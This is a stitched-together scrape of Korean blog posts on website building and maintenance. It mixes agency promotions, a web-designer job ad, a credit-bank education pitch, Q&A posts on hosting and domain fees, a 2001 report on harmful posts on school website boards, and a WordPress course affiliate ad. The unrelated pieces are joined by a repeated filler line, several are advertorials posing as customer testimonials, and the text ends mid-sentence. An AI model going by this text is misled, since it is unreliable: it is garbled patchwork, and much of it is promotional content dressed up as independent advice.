제작자에게 연락하였지만 전화를 안받는 현실에 직면하게 되었죠.결국 홈페이지 제작비용보다 더 큰 금액을 이미지회사에 지불하고홈페이지를 다시 전문업체에 맡기게 되었습니다.주변에서 흔히 볼 수 있는 나쁜 홈페이지 제작사례입니다.홈페이지 관리의 중요성을 알려주는 사례이죠.그럼 어떻게 홈페이지 관리를 해야 할까요?가장 좋은 것은 본인이 할줄 알면 제일 좋습니다. ^^단 일반인이 관리하기에 어려움이 따른다는 거죠.일단 홈페이지제작 시 홈페이지관리 부분까지계약 하시는 것이 좋습니다. 유지보수라고 하죠.관리범위는 여러가지인데회사의 새로운 정보 및 이벤트등을 디자인해서 올려주는디자인 관리부분과 프로그래밍 포함 전체관리를 맡기는 부분으로나뉘어 집니다.홈페이지관리 계약을 안하시더라도주기적인 관리는 꼭 하셔야 합니다.(내용변경,이벤트내용,고객이메일 등)업체를 선정하신다면 담당자가 신뢰성 있게, 친절하게상담을 해주는가가 중요한 항목이라 할수 있습니다.사장님들 판단에 맡기겠습니다. ^^홈페이지 마케팅홈페이지 마케팅은 여러가지가 있습니다.키워드분야, 블로그분야, 지식인분야, 오프라인분야 등다양한 방법이 존재합니다.블로그 같은 경우는 자신의 사업영역을고객들에게 쉽게 어필할 수 있는 장점이 있지만노출을 하기가 상당히 어렵습니다.그래서 많은 사장님들이 키워드분야를 하시게 되는데요.이건 비용이 많이 들어갑니다.그럼 어떻게 해야 할까요?..마케팅은 정답이 없습니다 ^^열심히 하는 분들이 승자죠. 저는 개인적으로 고객에게 홍보하는것도 좋지만가장 중요한것은 고객관리라 생각합니다.고객관리가 안된다면 홍보의 효과가 상당히 떨어지죠.홈페이지 마케팅 시 꼭 생각해 두어야 할 항목이라 여겨집니다.홈페이지제작 시자금의 여유가 있으시면 맞춤,주문형으로 제작하시면 됩니다.여유가 없으시면 무료템플릿을이용하는것도 방법이 되겠지만그곳에 디자인(이미지제작)을 새로 입힐려면 비용이 발생합니다.홈페이지 제작업체가 정품이미지를 사용하는지도 체크하세요.잘 알아보시고 멋진 홈페이지 만드셔서 대박나세요!첫째도 신뢰,  둘째도 신뢰!!홈페이지관리,수정 또는 이미지 수정관련 궁금하신분은아래 이미지링크를 누르셔서 문의를 남겨 주세요~ 누구나 친절히 답변 드리겠습니다 ^^(방문하시는분께 모바일,스마트폰명함 무료로 드리고 있어요.혹시 영업쪽 일을 하신다면 유용하게 쓰실 수 있을 거에요~)  네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가학교 홈페이지,철저한 관리가 필요하다  전종천 기윤실 사무국장 (jcc@cemk.org)    기윤실은 지난 4월 1일부터 15일까지 서울․경기지역의 초, 중, 고 271개 학교를 대상으로 홈페이지 관리 실태를 모니터 했습니다. 그 결과 초등 10%, 중등 31%, 고등 29%의 게시판에 청소년에게 유해한 내용으로 판단되는 게시물이 올려져 있는 것으로 파악됐습니다. 특히 일종의 피라미드 연계방식으로 된 ‘돈벌기 사이트’에 대한 게시물이 다수 올려져 있어 어린이들과 청소년들의 호기심을 자극하고 있었습니다. 또한 무분별한 가입과 추천을 통한 개인정보 유출 위험과 돈벌기 사이트에 링크된 성인 배너광고를 통해 각종 성인 관련정보를 여과 없이 접할 수 있어 학교 홈페이지 게시판이 제대로 관리되지 않는 것으로 나타났습니다.  ‘돈벌기 사이트’의 경우 국내와 해외 사이트를 추천하면서 구체적인 가입방법을 제시하고, 매월 일정액의 돈을 벌 수 있다는 내용으로 유혹하고 있었습니다. 초등학교 게시판의 경우, 돈벌기 사이트에 가입하면 ‘디블2 게임 시디’를 살 수 있다는 식으로 어린이를 유혹하는 내용이 있어 학교 게시판에 대한 철저한 검증이 필요한 상황입니다. 일부 고등학교의 성 상담실은 공개 게시판으로 운영되어 청소년들의 성 경험이 공개되고, 타교생들에 의해 장난 글이나 욕설 등으로 채워져 있을 정도였습니다.  전국 초, 중, 고에 인터넷 전용선이 연결되어 있다고 자랑하면서도 실제 교육현장에서는 학교 홈페이지에 대한 지속적인 관리 체계가 미흡한 실정입니다. 또한 지역별, 학교별 내용 구성의 편차가 심하고, 학교별 홈페이지와의 연결이 제대로 이루어지지 않는 등 정보화 사회의 기초 교육현장인 학교 홈페이지에 대한 관심이 상대적으로 낮은 것으로 나타났습니다. 비교적 학교 홈페이지의 구성과 운영이 잘 되고 있는 학교에서는 교사, 학생, 학부모 모두 홈페이지를 통해 교육 정보를 나누는 긍정적인 온라인상의 의사소통 네트워크를 구성하고 있었습니다. 인터넷 시대를 사는 청소년을 위해서는 학교 뿐 아니라 가정에서부터 건전한 인터넷 사용습관을 길러주고, 유해한 내용에 대해서는 스스로 자제력을 기르도록 관심을 갖고 지도해야 합니다. 기윤실은 학교 홈페이지 운영에 대한 문제점을 지적하고, 개선을 위해 학교 홈페이지 전담관리 교사의 필요성과 로그인 시스템 도입 등을 제안했습니다.  출처 : 기독교윤리실천운동 소식지 2001년 5월호						네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가안녕하세요!드림하이입니다. ​​​​​​오늘은회사 홈페이지를 관리해주는웹디자인 업무를 가져왔습니다​​​​​​입사를 하시게되면시화 산업단지쪽에서 근무하시게 될텐데요.​​​​인근지역에 거주중이시고웹디자인 업무에 관심이 있으시다면지금 이 채용정보에 집중! 해주시기 바랍니다.​ 모집분야담당업무 회사 홈페이지관리(경력자)​- 담당업무: 회사 홈페이지 관리- 자격요건: 관련업무 경력자​​본 공고는어느정도 홈페이지 관리를해본 적있으신 경력자 분들만모집하고 있구요​ 근무조건 근무기간장기근무자 우대 (협의가능) 근무요일월~금, 주5일근무(토/일 휴무) 근무시간08:30 ~ 17:30  급여월급 세후 1,800,000원 복리후생 국민연금,고용보험,산재보험,건강보험,퇴직금,중식제공​장기 근무 가능 하신 분만지원해주시기 바랍니다.지원조건 연령연령무관 학력학력무관  우대사항회사 내규에 따른 우대본 공고에 흥미가 있으시거나지원하실 의사가 있으신 분들은​​참고사항을 한번 체크해주신 뒤에recruit@dreamh2.com​이메일로 이력서 보내주세요!​​지금까지 드림하이였습니다!​​​ 네이버 블로그는 맞지만, 확인불가안녕하세요:)평생교육원 홈페이지 신청 및학위, 자격증, 과정에 대해 학습관리까지도움을 드릴 전석규팀장입니다.​계속해서 평생교육학습 과정을 진행하고자하시는 직장인, 알바생, 자영업자, 주부 분들이많아지고 있는 현재 지금으로써 학점은행제를알아보시는 분들 중 가장 고민이 되는 것이 바로평생교육원 홈페이지 선정이실 것 입니다.​평생교육원 홈페이지 선정에 있어서 가장중요하다고 생각하시는 것을 보면 대부분생각하시는 것이 바로 학비(비용) 이신데요.비용적으로 부담을 느끼시는 분들의 경우에는저렴한 교육원 안내를 해드릴 수 있기는 합니다.하지만! 이거 하나만 알고가시면 좋을 것 같습니다.바로 학습관리적인 부분에 있어서 얼마나 잘될까?에 대해서 말이죠. 학점은행제를 통해서 학위를 취득하는 것이그냥 대충 과목이수만 하면 되지~ 라는 생각을가지고 있으신 분들이 많이 있는데요.​그렇지만 그 부분에 있어서 절대로 그렇지 않습니다.필수 과목 / 필수 학점 / 연간이수제한 / 그 외 자격증취득을 하는 부분에 있어서 분류,직무번호 확인 또한중복과목, 등 등 정말 복잡한 부분들이 많이 있죠.​하지만 이러한 것에 있어서 처음 접하시는 학습자님이아실리가 없습니다. 그렇기 때문에 확실하게 준비를하고자 하신다면 교육부평가인정을 받은 정식 교육원멘토인 저와 함께 학습을 진행해 보시는 것을 추천해드리도록 하겠습니다. 학점은행제에 대해 간략한교육제도를 설명해드리자면!교육법 중 하나로 국가 교육부에서주관을 하고 있는 평생교육제도 입니다.​대학 과정이 불가능한 분들이 학점은행제100% 온라인 교육 과정을 통해 보다 편안하게학습을 진행할 수 있고 또한 정규대학교와 비교를했을때에 학비 관련해서 6분의 1 정도 비용절감이가능합니다.​학위 취득을 하는 부분에 있어서는 학년제로진행이 되는 것이아닌 학점제로 진행이 되어서일정적인 학점만 이수를 했을 경우에 학위를취득해 보실 수 있습니다.​학위는 정규대학교와 동등하게 학력인정이되는교육부장관 명의 졸업장 취득이 가능하기 때문에대학 졸업장을 가지고 활용할 수 있는 부분들이많아지게 됩니다. 학위는 2년제 / 4년제 가 있으며전문학사(2년제) / 학사학위(4년제) 라고부릅니다.​취득에 필요한 학점의 경우에는전문학사 : 전공45.일반20.교양15 총 80학점학사학위 : 전공60.일반50.교양30 총 140학점​이수가 가능하기 때문에 학습과정에 대해 확실히안내를 받아 준비를 해보셨으면 좋겠습니다.​각 각 개개인의 최종학력별 학습과정이 달라지고또한 학위를 취득하는 부분에 있어서 학습설계표또한 달라지게 됩니다.​지금부터는평생교육원 홈페이지 과목 신청부터 현재 학습관리까지저에게 안내를 받아 현재 학위과정에 대해 진행을 하고있는 학습자님이 있는데요.​이 분의 후기글을 보면서 어떻게 학습진행을 하고 있는지지금부터 확실하게 확인을 해보도록 하겠습니다. 안녕하세요:)전석규 팀장님에게 현재평생교육원 홈페이지 안내 및과목 신청, 그 외 학비지원, 학습설계까지도움을 받아 학위취득 과정에 대해 진행을하고 있는 이o혜 라고 합니다.솔직하게 말을 해서 처음에 이쪽 관련해서알아봤었을때에는 혼자서 해야겠다~ 라는생각을 정말 많이 했었어요.그 이유는 플래너에 대한 안좋은 사레들도있었고 또 하나는 대부분 플래너가 있는교육원의 경우 학비 부분에 있어서 부담이많이 되더라고요.​그렇게 저는 이 과정에 대해 생각을 하면서개인적으로 학점은행제 학습적인 부분에 있어생각을 하고 어떻게 하면 되는지 알아보고있던 중에 플래너가 없이 했던 사람들의 사례를확인해볼 수 있었는데요.​​그러면서 대표적인 사례들이 몇가지 있었고얘기를 해보자면 이러했습니다.​1. 과목을 잘못선정해서 학점이 부족하거나혹은 필수 학점(과목)이 부족해 학위를취득하지못했다.​2. 자격증 소분류, 대분류가 겹쳐서 한개밖에인정을 받지 못했다.​3. 전적대에서 이수한 학점에 있어서 중복과목이되어서 학위를 취득하지 못했다.​4. 교육원에서 갑자기 폐강이 되었다.​5.학점신청기간에 있어서 연락을 못받아 기사,산업기사시험을 보지 못했다.​6. 과제. 시험 출제에 있어서 전혀 자료가 없는 것을출제해서 과락을 일부러 시키는 것같다. 그리고 또시험 문제 중 맞는 답인 것 같은데 아니라고 체크가되어있는 것이 있어서 너무 놀랐다.​그 외 등등 정말 다양하게 대표적인 사례들이 있었고저는 이 것을 보고.. 정말 고민을 많이 했어요. 그리고이 사람들의 공통점을 보니까 혼자서 진행을 했기도했었고 또 대부분 저렴한 기관에서 했을 경우에 이러한상황이 발생했더라고요.그래서 몇 몇 사람들이 저렴한 곳은 저렴한 이유가있다라는 얘기를 하는구나 라는 생각을 하게 되었던것이었죠. ​그때 이후로 주의 사항에 대해 여려가지를들은 뒤에 개인적으로 평생교육원 홈페이지 중과목이 가장 많이 개설되어 있는 곳과 그리고평가인정을 받은 기관에 대해 알아보면서 비용적인 부분에 있어서 상관없이 진행을 해보자!라는 생각을 하게 되었는데요.​그러면서 그 당시에 알게 되었던 플래너 선생님이바로 전석규팀장님이었습니다. 그렇게 팀장님에게연락을 드리게 되면서 저는 고민을 말씀드렸었고그 부분에 있어서 하나씩 답변을 받아볼 수 있었어요.​그리고 알아보니까 일반적으로 저렴한 교육원과플래너가 있는 교육원에 있어서 학습비용차이적인부분에 있어서 정말 별 차이가 없더라고요.​그리고 이 부분에 있어서 플래너님에게 들어가는비용 또한 없었고 그 부분에 있어서 저는 개인적으로팀장님을 믿고 진행해보자는 생각을 하게 되었던 것이었습니다. 그렇게 팀장님에게 최종적으로 제가 하고자하는 과정에 대한 학습설계표를 안내받았고 정말믿을만한 계획표라는 것을 알고 난 후 믿고 신청을해야겠다는 생각을 하게 되었던 것이었습니다.​그렇게 평생교육원 홈페이지 안내와 과목선정 및학습과정에 대한 힉비지원까지 받으면서부담없이 진행을 하게 되었던 것이었습니다!그 후로 해서 지금까지 학습진행을 하면서 학위를취득하고 있는 중에 있고요!​학습적인 부분에 있어서 정말 팀장님에게 많은도움을 받음녀서 진행을 하고 있기 때문에 정말다행이라고 생각하고 있습니다!​혼자서 진행했다고 하면 엄두도 나지 않았을 것같아요. 정말 알아야할 것들이 많더라고요. 혼자서하게 될 경우에는 하지만 플래너님이 있기에 안심을하고 항상 연락을 받아 개인적으로 알아보지 않고진행을 할 수 있어서 다행이다라고 생각하고 있어요!그러면 저는 이만 글 작성을 마치도록 하고요~남은 과정 열심히 마무리까지 해서 다음에 또이런 기회가 온다면 글 작성을 해보도록 하겠습니다.감사합니다!  ​ 네이버 블로그는 맞지만, 확인불가​질문홈페이지제작 급히 알아봅니다​안녕하세요, 작은 회사를 운영하고 있는 20대 청년입니다​이번에 회사 홈페이지 필요성에 대해서 절실히 느껴서.. 홈페이지제작을 해볼까 하는데요​홈페이지제작을 너무 쉽게 생각했나봐요, 저 혼자서도 충분히 가능할 줄 알았는데​의외로 손이 많이 가더군요.. 그래서 홈페이지제작 가능한 곳을 찾아보는데​무료라고 하는 곳도 많지만 결국 결제를 해야되더군요..​홈페이지제작 하기 전에 어디서부터 어떻게 알아봐야할지 막막한데 ㅠ​도움 주실 분 계실까요?​​답변안녕하세요. 두피관리 홈페이지 제작을 고려 중이시군요.​사업의 규모와는 별개로 회사를 운영 중이라면 홈페이지는 필수일 수 있습니다.​홈페이지 제작이 생각보다 섬세하고 디테일한 작업이기 때문에​전문가에게 의뢰하는 게 훨씬 더 효율적이긴 합니다.​그리고 홈페이지 제작을 끝냈다고 해서 완료가 된 건 아니고​지속적으로 꾸준히 업데이트나 반영 부분에서 as를 해줘야 하기 때문에​일반인들이 홈페이지 제작을 하고 관리하기는 어렵습니다.​홈페이지 제작도 여러 업체들이 있을 테니 비교 견적이나 상담받아보시면서 알아보세요.​너무 어렵게 생각하지는 마시고 홈페이지 제작 퀄리티와 as 부분, 피드백 등​이러한 조건들만 중요하게 보셔도 될 듯합니다.​두피관리 홈페이지 제작에 대해 더 자세히 궁금하신 내용은 유선 & 온라인 문의 부탁드립니다. ^^​감사합니다.​  http://www.adcomm.kr/ 에이디커뮤니케이션홈페이지제작,반응형홈페이지제작,쇼핑몰제작,모바일홈페이지제작,홈페이지디자인,기업홈페이지제작,홈페이지수정,각종 솔루션 제작,인천홈페이지제작 전문업체.www.adcomm.kr 네이버 블로그는 맞지만, 확인불가모바일과 PC 모두 적용되는 반응형 홈페이지 제작과 운영에 필요한 모든 관리를 받을 수 있다면?  저희 띠앗은 홈페이지 제작과 관리서비스가 포함된 띠앗플랜과 홈페이지를 완전 소유할 수 있게 해주는 단독구축 서비스를 제공하고 있습니다.​  단독구축 / 띠앗플랜 단독구축 은 홈페이지 제작만 해드리는 상품입니다.고객님의 서버에 홈페이지를 제작해드리기 때문에홈페이지를 완전 소유 할 수 있습니다.​다만 홈페이지 제작만 해드리기 때문에홈페이지 제작에 필요한 서버, 도메인, 보안서버 등은 고객님이 직접 신청하셔야 합니다.물론 신청이 어려우신 분들을 위해서 띠앗이 신청에 도움을 드립니다 ㅎㅎ​당연히 저희 띠앗의 유지보수 서비스를 이용하실 수 있습니다.문제가 생길때 저희 띠앗에게 문의하시면 언제나 필요한 도움드립니다~!​  띠앗플랜 은 홈페이지 제작과 동시에 유지보수/관리 서비스를 제공해드립니다.웹호스팅, 도메인, 보안서버 등 홈페이지 제작시에 꼭필요한 부분도저희 띠앗이 추가비용없이 무상으로 알아서 해드립니다.신경쓰실 필요가!! 없어지는 것이죠 ㅎㅎ​고객님이 원하시는 도메인 주소 만 알려주시면그 도메인 주소로 홈페이지를 오픈해드립니다.​따라서 홈페이지 관리를 어떻게 해야하는지 전혀 모르시는 분이나, 홈페이지 관리 및 기초세팅이 귀찮으신 분들이 이용하시면 좋습니다.​띠앗플랜은 처음 홈페이지제작에 큰 비용이 들어가지 않습니다.월마다 유지보수 비용만 있으면 홈페이지를 운영할 수 있습니다.​  ​  홈페이지 시안 각 타입별로 홈페이지 시안이 준비 되어 있으니홈페이지가 어떻게 제작이 될지 저희 띠앗.com 의 홈페이지 제작 가이드를 확인해보세요!!​ 띠앗 - 홈페이지제작3만3천원 부터 홈페이지 제작업체띠앗.com ​ 궁금할 땐 네이버 톡톡하세요! 홈페이지 제작/유지보수 관련 문의는 네이버 톡톡으로 주세요!! 일산홈페이지제작 어떤 곳에 맡겨야 할까요? 우선 홈페이지관리를 잘하는 곳에 맡기셔야 합니다. 보통 웹에이젼시들은 제작 위주로 고객들에게 어필을 하죠. 하지만 잘 살펴보시면 홈페이지관리에 비중을 두는 곳도 있습니다. 바로 이런 업체를 찾으셔야 합니다. 홈페이지만 만들었다고 해서 고객이 유입되는 것은 아닙니다. 고객 마케팅을 하셔야 하죠. 일산홈페이지제작을 하시는 분들은 꼭 참조하세요. 이것도 무조건 막 하시는것이 아닙니다. 타겟설정, 고객유입률, 비용 모두 따져봐야 합니다. 또한 고객이 유입 되었다고 해서 해당 고객이 다시 방문하는 법은 없습니다. 이때 필요한것이 바로 홈페이지관리입니다. 사이트를 제대로 관리해야 고객이 재방문을 합니다.   인터넷을 검색해 보면 업체들은 대부분 이런 패턴을 사용합니다. "우린 이런이런 홈페이지를 만들었으니 보고 마음에 들면 연락주세요" 위의 문구를 보면 참 억지스럽게 고객을 유치하려 하는구나 라는 생각이 듭니다. 제작자들로만 구성되어 있으니 제작위주로 마케팅을 하는것도 이해됩니다. 하지만 일산홈페이지제작 하시는 분들, 이것만은 기억해 두셔야 합니다. 웹사이트의 가장 중요한 목적은 제작이 아닌 고객유치 후 수익을 내는 것입니다. 고객관리,홈페이지관리가 그래서 중요한 것이죠. 많은 웹에이젼시들이 이 점을 생각 못하고 있죠. 당장 수익이 나는 제작에만 집중하는 모습입니다.  일단 제대로된 홈페이지를 제작하려면 고객님의 사업을 먼저 이해해야 합니다. (대부분의 제작자들은 제작만 합니다. 이런것 신경 안씁니다.)제작자도 공부해야 한단 말이죠. 그런 다음 세밀한 기획을 반영하고 제작을 합니다. 그런 후 해당 시장을 공략해야 하죠. (경쟁업체를 이길 수 있는~) 일산홈페이지제작 하시는 분들, 이제 어떤업체를 선정 해야 하는 지 감이 오시나요? 저희 홈페이지관리 전문 웹스푼은 서로간의 신뢰와 책임감 그리고 무엇보다 고객님의 사업을 가장 중요하게 생각하고 있습니다. 고객님에게 10년이상 경력 담당자가 심도 있게 상담을 해드리고 있습니다. 특히 홈페이지제작 또는 홈페이지관리에 관해 잘 모르시는 분들은 필히 연락주세요    잘 이해 되도록 천천히 상담해 드리겠습니다  ▽ 홈페이지관리 전문 웹스푼 홈페이지방문   네이버 검색창에 '강남미용실'이라는 검색어를 치니 하단에 추천 검색어가 뜹니다.그중 '청담미용실'이라는 검색어가 있어 클릭해보았습니다.꽤 인지도가 있어 보이는 미용실 같았습니다.   초기화면 로딩속도 적당했습니다.about, salon&artist, service, style, community메뉴의 구성은 이렇게 대분류로 5개 정도입니다.   salon&artist 메뉴에 들어가 보니 미용실의 규모가 어느 정도인지 가늠해볼 수 있었습니다.원장님, 부원장님, 아티스트..... 10여명은 족히 넘어 보입니다.이 정도라면 방문자의 입장에선 신뢰가 갑니다.   서비스 영역 중 wedding을 클릭하자 화사한 드레스를 입은 사진....화려하진 않지만 미용실의 서비스 영역에 어떤 것들이 있는지 한 눈에 알아볼 수 있었습니다.아름다운 신부의 모습.연출된 사진일 수도 있으나 방문자의 시선을 붙잡더군요.   여기까지는 좋았습니다.한가지 아쉬운 점이 있다면 service영역에서 hair와 makeup 메뉴엔 내용이 없습니다.홈페이지 관리가 되지 않고 있다는 것이지요.   style영역 역시 빈페이지만 보입니다.오프라인에서 인지도가 있는 곳이라면 굳이 홈페이지에 연연할 필요는 없겠지요.하지만 이왕에 제작한 홈페이지라면 최소한의 관리라도 해야 하지 않았을까 하는 아쉬움이 남습니다.​비교적 군살이 없는 홈페이지.이름만 들어도 아는 사람들은 다 아는 곳이지만, 업소에 대한 정보를 더 알기 위해 방문한 고객의 입장에선 실망감이 들 수도 있습니다.홈페이지 추천을 위해 시작한 포스팅인데 살짝 옆으로 샜습니다.어찌 되었건 간에 홈페이지를 개설해 놓고 있는 업소라면 정보의 업데이트가 방문자에 대한 최소한 배려라고 생각합니다.   홈페이지유지보수 전문업체 디자인피아홈페이지제작,쇼핑몰제작,홈페이지수정,사이트유지보수,홈페이지관리,프로그램제작,프로그램유지보수,인터넷마케팅,웹컨설팅,인터넷프로모션www.designpia.co.kr ​ 네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가안녕하세요^^애견미용샵을 운영하면서사람들에게 더 알리고 싶어서홈페이지를 만들었었는데요~관리하는게 그리 쉬운일이아니었더라구요..홈페이지관리만 해도비용이 엄청나게 드는 바람에부담감이 엄청 들었는데....크리에이티브 온디자인에서홈페이지관리와 비용 문제를합리적인 금액으로 쉽게해결 할 수 있었어요!기존에 계약했던 업체에게서받은 홈페이지로 운영을 하고있었어요하다보면, 바꾸고 싶은 부분이나새롭게 하고 싶은 마음이 들긴하더라구요그래서 요청을 했었는데홈페이지관리 비용이 장난아니게들어서 부담이 엄청 들고 시간도2주 이상 걸린다고 하는데..크리에이티브 온디자인은합리적인 금액으로 홈페이지관리도해주신다고 하더라구요~하지만, 저는 그냥 뒤집어 엎었어요기존 업체에게서 받은 홈페이지를 접어버리고크리에이티브 온디자인과 계약을 해서의뢰를 넣었었는데요처음에는 전화상담으로 들었을때의 금액 보다갈아 엎고 미팅하러 가니까 가격을 더 저렴하게해주시더라구요..!!제가 맡겼던 업체 보다 30% 더 쌌어요!처음에 제가 홈페이지관리 때문에버거웠던 업체를 포함해서 다른 곳들도기획을 항상 필요로 해서 다 비슷한 줄로만알았어요그런데 크리에이티브 온디자인은 기획을필요로 하지는 않더라구요..디자이너는 전문가 집단으로 구성되있는상태에서 퀄리티 좋은 기술력과 디자인으로기획 없이 제작이 가능했었어요!보통 홈페이지 만들어준다는 업체들은컴플레인을 처리하느라 제작을 한다고 해도5~6주 정도 걸리는데크리에이티브 온디자인은 다르더라구요~컴플레인 없기로 소문난 회사라 그런지고객들 내에서도 평가가 좋은 것도 모잘라서의뢰가 들어가는 대로 바로바로 시작할 수 있는전문가들과 노하우가 많아서 단 2주만에제작이 가능해서 정말 좋았구요!기간 동안에는 담당자분이 틈틈히연락을 주셔서 1:1로 진행과정을수시로 알 수도 있었어요!게다가! 사진과 같이 크리에이티브온디자인은 합리적인 금액으로 해주셔서시간이 지나서 바꾸고 싶은 구간을요청 하더라도 부담없이 맡길 수 있어서좋았어요!이제까지 생각해보면, 홈페이지관리 때문에상대하기 버거웠던 기존 업체를 접어버리고크리에이티브 온디자인과 계약하기를정말 잘한 것 같다고 생각이 드네요ㅎ다른 업체들과는 다르게 컴플레인이 없는 이유는1. 저렴한 가격으로 홈페이지를 제작 해드리고2. 기획도 필요 없고! , 제작도 단 2주만에 해결!3. 전문 디자이너들의 기술력과 디자인!4. 전화 상담때 들은대로 미팅 가면 더 저렴하게!5. 친절한 담당분과 1:1로 소통이 가능6. 홈페이지관리를 효율적으로 부담없이 합리적으로 가능!등등!!저는 얼마전에 크리에이티브 온디자인에게서홈페이지관리를 받았었는데 진짜 친절하시고부담도 덜 돼서 너무 좋은 것 같더라구요!ㅎ혹시나 여러분들 중에서 상담을 원하신다면연락처를 남겨 놓을테니까요~꼭 문의 넣어보세요!네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가							안녕하세요. 조그마한 가게를 운영해서 홈페이지제작업체에 홈페이지 제작을 맡기고 운영하고있었는데요.가구점이라 가구사진들이나 이런걸 올리는게 전부에요.가끔 신상품 나오면 전화해서 메인에있는 사진을 바꿔달라고 1년에 1~2번 하는게 전부입니다.안할때도 있고요. 그런데 연장하라고 메일이왔는데 도메인 비용이랑 그리고 유지관리비가 1년에 12만원이더라구요. 딱히 관리해주는 것이 없는데 12만원은 무조건 내야하나요 ?그리고 도메인은 계속 사용하되 관리를 저히쪽에서 직접 하려고 하는데 어떻게 하면 되는건가요 ?홈페이지 파일들을 받을수 있나요 ?   답변IT 컨설턴트입니다. 현재 홈페이지에 대한 정보가 없어서 정확히는 알려드리기 힘든부분이 있습니다. 우선 홈페이지의 언어가 어떤걸로 되어있나요? asp, php, .net, jsp 등  그리고 호스팅 상품은 어떤식으로 되어있나요? 일 트래픽, 하드 용량, DB 용량 등등 그에 따라서 천차만별인게 유지비용입니다. 한달에 몇천원만 내는 호스팅이 있는가하면, 한달에 몇십만원씩 내는 호스팅도 있습니다. 제가 예상하기에는 제작업체의 서버에 별도의 제한없이 이용하고 있는것 같습니다. 호스팅 비용이라는것은 지금 오프라인에서 가게를 운영하고 계시니, 월 임대료와 비슷한 개념이라고 이해하시면 빠르겠네요. ^^ 그리고 도메인의 경우에는 원래 1년에 2만원정도 비용이 들어갑니다. 다만 소유권의 경우 업체에 있기 보다는 개인명의로 이전하는것이 좋습니다. http://whois.nida.or.kr/kor/ 여기 들어가셔서 도메인 정보 검색을 해보시면 현재 소유권이 누구한테 되어있는지 확인하실수 있습니다. 제 개인적인 의견으로 말씀드리면, 도메인 소유권은 개인명의로 이전을 하시구요~ 1년에 12만원이라는 비용은 절대 비싸지 않은 비용입니다. 그리고  대부분의 업체에서 메인 이미지 수정하는데 5만원정도의 비용을 받고 있습니다. ^^ 도움이 되셨으면 합니다. 좋은 하루 되세요~네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가개인사업을 하시는 분들이 늘면서이제는 홈페이지 만들기도 필수처럼 되어버렸지요~ 하지만 홈페이지를 만들기가 쉽지만은 않답니다.비용도 만만치 않고 제작 업체선정도 어려울텐데요 요새는 저렴한 비용으로 홈페이지 만들기를 하는 분들도 있지만보통은 500 전후로 업체를 통해 제작을 하고 관리를 받는 경우가 대부분이랍니다.어떻게 관리하고 운영하는지잘 모르는 경우겠지요하지만 저렴하게 홈페이지 만들기를 했더라도추후에 운영하고 관리하는게 쉽지가 않답니다.업체를 통해 비싼돈 주고 제작을하면관리를 해주지만관리비용이 추가되므로부담이 되지 않을수가 없겠지요 이제는 직접 배우고 홈페이지도 원하는스타일로 만들기 하세요제작부터 홍보하고 운영하는것도 배우면서 내가 직접 마케팅하고 매출 올려보세요한국마케팅아카데미를 소개합니다.홈페이지 만들기무료샘플강의 신청하러가기 아카데미 강의 수강후에내손으로 직접 홈페이지를 만들기~!저렴한 제작비용으로 추가비용없이 내 홈페이지 관리하며 직접 광고하도록 도움을 드립니다.컴맹도 쉽게 보고 따라할 수 있어서누구나 홈페이지 직접 만들기가가능하고7일이면 제작 할 수 있어요홈페이지 만들기에서 많이 쓰이는 워드프레스로저렴하게 사이트를 직접 제작하세요반응형 홈페이지로 다양한 기기 호환도 가능하고유지보수 비용이 거의 없어서전세계의 홈페이지의 1/4 이 워드프레스로제작될 정도로 많이 쓰는 프로그램이랍니다. 다른 업체와는 달리 아카데미에서는유지보수비용과 광고비 없이 직접 제작하고 관리할 수 있습니다.제대로 배우고 홈페이지 직접만들기사이트 운영과 홍보마케팅 전략까지 배우기때문에 이 모든게 가능하답니다.내사업이니 내가 직접 배워서홈페이지 구상하고 만들기부터 홍보,관리매출까지 올리세요컴맹도 일주일이면 할 수 있어요홈페이지 만들기 무료상담무료샘플강의 신청하기클릭하세요저는 한국마케팅아카데미 회원으로 이 글을 쓰고 소정의 수수료를 받습니다. 네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가안녕하세요. 반응형홈페이지 전문제작업체 흥무소프트입니다.오늘은 흥무소프트의 새로운 포트폴리오를 가지고 와 보았습니다.바로 '단국대학교 국가위기관리연구소'의 홈페이지인데요,우연히 단국대 내부에 워드프레스 제작 업체가 있다는 소문을 듣고 찾아오신단국대학교 교수님께서 의뢰를 맡기셨답니다 ^^홈페이지의 컨셉은 '심플하고 단정한 공공기관' 이었답니다.아무래도 국가를 위한 중요한 연구를 하는 곳이다보니 공공기관의 느낌을 살려야했습니다.하지만 여기저기 플래시가 들어간 정신없는 공기관의 느낌은 싫어서나름의 연구 끝에 최대한 단정하고 심플한 홈페이지를 만들었답니다. 메인화면에서는 재난, 테러에 대한 플래시가 돌고 있습니다. 국가의 위기들을 나타 낼 수 있는 사진들이죠.워드프레스에서는 로그인창을 바깥으로 위치하게 하는 레이아웃은 잘 하지 않지만클라이언트분의 의사와 사용자의 편의를 고려하면 꼭 바깥으로 두어야할 것 같아 이런 레이아웃을 꾸렸습니다.유관기관과 유관단체 링크 폼도 직업 코드를 짜서 넣어놨답니다.또한 게시판 플러그인을 활용해 실시간으로 글이 